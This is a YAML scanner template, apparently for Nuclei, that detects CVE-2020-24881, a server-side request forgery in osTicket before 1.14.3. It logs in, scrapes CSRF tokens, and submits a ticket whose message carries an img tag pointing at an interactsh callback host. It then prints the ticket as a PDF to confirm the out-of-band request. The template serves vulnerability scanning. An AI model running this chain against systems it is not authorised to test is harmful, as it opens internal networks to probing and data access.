flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - group: 1
    internal: true
    name: csrf_token
    part: body
    regex:
    - <meta name="csrf_token" content="(.+?)" \/>
    type: regex
  raw:
  - 'GET /login.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    __CSRFToken__={{csrf_token}}&luser={{username}}&lpasswd={{password}}

    '
- extractors:
  - group: 1
    internal: true
    name: option_value
    part: body
    regex:
    - Select a Help Topic.+?[ \n]+<option value="(\d+)" >
    type: regex
  - group: 1
    internal: true
    name: csrf_token2
    part: body
    regex:
    - <meta name="csrf_token" content="(.+?)" \/>
    type: regex
  raw:
  - 'GET /open.php HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: formid
    part: body
    regex:
    - <label for=\\"([^"]+)\\">
    type: regex
  - group: 1
    internal: true
    name: ticketid
    part: header
    regex:
    - 'Location: tickets\.php\?id=(\d+)'
    type: regex
  matchers:
  - dsl:
    - status_code_2 == 302
    internal: true
    type: dsl
  raw:
  - 'GET /ajax.php/form/help-topic/{{option_value}} HTTP/1.1

    Host: {{Hostname}}

    Referer: http://{{Hostname}}/open.php

    '
  - 'POST /open.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------266856663522356381601517168829


    -----------------------------266856663522356381601517168829

    Content-Disposition: form-data; name="__CSRFToken__"


    {{csrf_token2}}

    -----------------------------266856663522356381601517168829

    Content-Disposition: form-data; name="a"


    open

    -----------------------------266856663522356381601517168829

    Content-Disposition: form-data; name="topicId"


    {{option_value}}

    -----------------------------266856663522356381601517168829

    Content-Disposition: form-data; name="{{formid}}"


    1

    -----------------------------266856663522356381601517168829

    Content-Disposition: form-data; name="message"


    <img src="https://11111.{{interactsh-url}}">

    -----------------------------266856663522356381601517168829

    Content-Disposition: form-data; name="draft_id"



    -----------------------------266856663522356381601517168829--

    '
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - contains(content_type, "application/pdf")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /tickets.php?a=print&id={{ticketid}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2020-24881
info:
  author: hnd3884
  classification:
    cpe: cpe:2.3:a:osticket:osticket:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-24881
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-918
    epss-percentile: 0.99555
    epss-score: 0.9004
  description: 'SSRF vulnerability exists in osTicket before 1.14.3, allowing an attacker
    to add malicious files to the server or perform port scanning.

    '
  impact: 'Authenticated attackers can perform SSRF attacks to scan internal ports,
    access internal services, or retrieve sensitive information from internal systems.

    '
  metadata:
    max-request: 6
    product: osticket
    shodan-query: title:"osticket"
    vendor: osticket
    verified: true
  name: OsTicket < 1.14.3 - Server Side Request Forgery
  reference:
  - https://blackbatsec.medium.com/cve-2020-24881-server-side-request-forgery-in-osticket-eea175e147f0
  - https://nvd.nist.gov/vuln/detail/CVE-2020-24881
  remediation: 'Upgrade to osTicket version 1.14.3 or later.

    '
  severity: critical
  tags: cve,cve2020,osticket,ssrf,authenticated,vuln
